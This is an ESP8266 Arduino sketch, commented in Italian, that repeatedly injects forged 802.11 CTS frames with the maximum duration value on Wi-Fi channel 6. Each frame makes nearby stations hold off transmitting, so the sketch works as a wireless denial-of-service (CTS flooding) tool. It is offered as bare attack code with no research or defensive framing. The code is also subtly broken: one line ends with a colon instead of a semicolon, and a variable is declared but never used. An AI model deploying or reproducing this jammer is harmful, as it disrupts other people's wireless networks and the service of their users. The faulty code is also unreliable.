#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

uint8_t cts_packet[14] = {
    0xC4, 0x00,                         // Frame Control: Type Control, Subtype CTS
    0xFF, 0x7F,                         // Duration: 32767 microsecondi (~32.7 ms)
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Receiver Address (RA)
    0x00, 0x00, 0x00, 0x00              // Frame Check Sequence (FCS)
};

void setup() {
  int channel = 6:

  Serial.begin(115200);
  
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  
  wifi_set_channel(6);
  
  Serial.println("Avvio iniezione pacchetti CTS...");
}

void loop() {
  wifi_send_pkt_freedom(cts_packet, sizeof(cts_packet), 0);
  delay(30); 
}
